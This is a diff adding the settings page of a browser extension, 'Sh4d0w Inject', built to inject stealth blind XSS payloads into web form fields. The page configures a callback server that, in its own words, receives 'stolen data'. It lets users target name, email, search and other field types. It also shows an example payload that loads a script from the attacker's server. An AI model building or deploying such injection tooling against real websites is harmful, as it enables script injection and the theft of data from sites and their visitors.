@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sh4d0w Inject — Settings</title>
+    <link rel="stylesheet" href="options.css">
+</head>
+
+<body>
+    <div class="options-container">
+        <!-- Header -->
+        <header class="options-header">
+            <div class="header-left">
+                <div class="logo-icon">
+                    <svg width="32" height="32" viewBox="0 0 28 28" fill="none">
+                        <path d="M3 14l5-5M3 14l5 5" stroke="#00ff41" stroke-width="2" stroke-linecap="round" />
+                        <path d="M25 14l-5-5M25 14l-5 5" stroke="#00ff41" stroke-width="2" stroke-linecap="round" />
+                        <circle cx="14" cy="11" r="5" stroke="#00ff41" stroke-width="1.5" fill="none" />
+                        <circle cx="12" cy="10" r="1.2" fill="#00d4ff" />
+                        <circle cx="16" cy="10" r="1.2" fill="#00ff41" opacity="0.5" />
+                        <path d="M11 15h6l-1 4h-4z" stroke="#00ff41" stroke-width="1" fill="none" />
+                    </svg>
+                </div>
+                <div>
+                    <h1>Sh4d0w <span class="accent">Inject</span> — Settings</h1>
+                    <p class="subtitle">Configure your stealth XSS payloads and injection rules</p>
+                </div>
+            </div>
+        </header>
+
+        <main class="options-main">
+            <!-- Blind Server URL -->
+            <section class="card">
+                <h2 class="card-title">
+                    <span class="card-icon">🌐</span>
+                    Blind XSS Server URL
+                </h2>
+                <p class="card-desc">Your callback server URL. All payloads will use this URL to send stolen data back
+                    to you.</p>
+                <div class="input-row">
+                    <input type="text" id="serverUrl" class="input-field" placeholder="https://your-id.xss.ht">
+                    <button id="saveServerBtn" class="btn btn-primary">Save</button>
+                </div>
+                <div id="serverSaveStatus" class="save-status"></div>
+            </section>
+
+            <!-- Enabled Payload Types -->
+            <section class="card">
+                <h2 class="card-title">
+                    <span class="card-icon">🎯</span>
+                    Payload Types
+                </h2>
+                <p class="card-desc">Enable or disable payload injection for specific field types.</p>
+                <div class="toggle-grid" id="toggleGrid">
+                    <!-- Populated by JS -->
+                </div>
+            </section>
+
+            <!-- Custom Payloads -->
+            <section class="card">
+                <h2 class="card-title">
+                    <span class="card-icon">💉</span>
+                    Custom Payloads
+                </h2>
+                <p class="card-desc">Add your own XSS payloads. Use <code>{{SERVER}}</code> as placeholder for your
+                    server URL.</p>
+
+                <div class="custom-payload-input">
+                    <select id="payloadType" class="input-field select-field">
+                        <option value="generic">Generic</option>
+                        <option value="name">Name Fields</option>
+                        <option value="email">Email Fields</option>
+                        <option value="phone">Phone Fields</option>
+                        <option value="url">URL Fields</option>
+                        <option value="subject">Subject Fields</option>
+                        <option value="message">Message/Textarea</option>
+                        <option value="address">Address Fields</option>
+                        <option value="company">Company Fields</option>
+                        <option value="search">Search Fields</option>
+                    </select>
+                    <textarea id="customPayload" class="input-field textarea-field"
+                        placeholder='Enter your XSS payload... e.g. "><script src="{{SERVER}}"></script>'></textarea>
+                    <button id="addPayloadBtn" class="btn btn-accent">+ Add Payload</button>
+                </div>
+
+                <div class="custom-payloads-list" id="customPayloadsList">
+                    <!-- Populated by JS -->
+                </div>
+            </section>
+
+            <!-- Import / Export -->
+            <section class="card">
+                <h2 class="card-title">
+                    <span class="card-icon">📦</span>
+                    Import / Export
+                </h2>
+                <p class="card-desc">Backup or restore your custom payloads and settings.</p>
+                <div class="btn-group">
+                    <button id="exportBtn" class="btn btn-outline">📥 Export Config</button>
+                    <button id="importBtn" class="btn btn-outline">📤 Import Config</button>
+                    <input type="file" id="importFile" accept=".json" style="display: none;">
+                </div>
+            </section>
+
+            <!-- Default Payload Preview -->
+            <section class="card">
+                <h2 class="card-title">
+                    <span class="card-icon">📋</span>
+                    Built-in Payloads Preview
+                </h2>
+                <p class="card-desc">These are the default payloads included with the extension. They cannot be deleted
+                    but can be supplemented with custom ones.</p>
+                <div class="payload-preview" id="payloadPreview">
+                    <!-- Populated by JS -->
+                </div>
+            </section>
+
+            <!-- Reset -->
+            <section class="card danger-card">
+                <h2 class="card-title">
+                    <span class="card-icon">⚠️</span>
+                    Danger Zone
+                </h2>
+                <div class="btn-group">
+                    <button id="resetBtn" class="btn btn-danger">🗑️ Reset All Settings</button>
+                </div>
+            </section>
+        </main>
+
+        <footer class="options-footer">
+            <span>Sh4d0w Inject v3.1 — Born in the Shadows 🖤</span>
+        </footer>
+    </div>
+
+    <script src="../lib/payloads.js"></script>
+    <script src="options.js"></script>
+</body>
+
+</html>
